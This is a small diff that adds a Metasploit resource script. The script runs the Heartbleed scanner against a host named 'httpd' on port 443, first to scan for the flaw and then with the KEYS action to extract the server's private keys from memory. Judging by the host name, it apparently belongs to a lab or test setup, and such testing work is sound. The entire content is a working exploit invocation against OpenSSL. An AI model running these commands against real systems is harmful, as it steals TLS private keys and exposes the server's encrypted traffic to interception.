@@ -1,0 +1,12 @@
+use auxiliary/scanner/ssl/openssl_heartbleed
+set RHOSTS httpd
+set RPORT 443
+
+set ACTION SCAN
+run
+
+set ACTION KEYS
+set THREADS 4
+run
+
+quit
